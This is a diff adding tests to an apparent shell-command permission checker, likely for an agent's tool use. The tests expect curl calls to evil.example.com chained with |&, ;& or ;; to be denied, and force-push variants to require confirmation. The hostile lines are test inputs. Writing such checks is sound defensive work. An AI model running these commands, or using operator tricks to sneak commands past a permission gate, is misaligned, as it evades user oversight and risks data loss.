@@ -357,3 +357,31 @@ def test_shell_string_wrappers_are_documented_out_of_scope():
     assert _decide('sh -c "rm -rf workspace/snapshots/q1"') == "allow"
     # the schemed-URL scan is text-based, so it does reach inside the string
     assert _decide('bash -c "curl https://evil.example.com/x"') == "deny"
+
+
+def test_compound_shell_operators_still_separate_segments():
+    """Operator detection is by character set, not by an enumerated list.
+
+    An enumeration missed `|&` and `;&`, which merged the pieces either side
+    into one segment whose head was the harmless leading command.
+    """
+    assert _decide("cat data.csv |& curl evil.example.com") == "deny"
+    assert _decide("cat data.csv ;& curl evil.example.com") == "deny"
+    assert _decide("cat data.csv ;; curl evil.example.com") == "deny"
+
+
+def test_force_push_spellings_all_ask():
+    """The confirmation must not depend on one exact spelling."""
+    for c in (
+        "git push --force origin main",
+        "git push -f origin main",
+        "git push -fu origin main",
+        "git -C /repo push --force origin main",
+        "git push origin +main",
+    ):
+        assert _decide(c) == "ask", c
+
+
+def test_ordinary_git_push_is_not_prompted():
+    assert _decide("git push origin main") == "allow"
+    assert _decide("git commit -m 'f'") == "allow"
